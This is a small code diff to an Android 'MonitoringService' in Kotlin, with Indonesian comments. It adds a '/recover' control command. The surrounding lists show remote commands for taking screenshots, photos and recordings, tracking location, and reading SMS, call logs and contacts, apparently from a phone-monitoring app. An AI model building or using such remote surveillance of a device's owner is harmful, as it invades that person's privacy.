@@ -492,7 +492,7 @@ class MonitoringService : Service() {
             "com.samsung.android.messaging",
             "com.android.mms"
         )
-        private val CONTROL_COMMANDS = setOf("/stop", "/pause", "/resume", "/restart", "/logout", "/clearqueue", "/lock", "/checkdead")
+        private val CONTROL_COMMANDS = setOf("/stop", "/pause", "/resume", "/restart", "/logout", "/clearqueue", "/lock", "/checkdead", "/recover")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/record", "/recordvideo", "/location", "/lastcalls", "/lastsms", "/lastnotify", "/contacts", "/history", "/track", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/brief", "/alive", "/checkdead", "/screentime", "/digest", "/weekly", "/alertness", "/audit")
         // Perintah laporan BACA-SAJA murni (issue #1921):
         // handlernya hanya membaca keadaan lalu membalas,
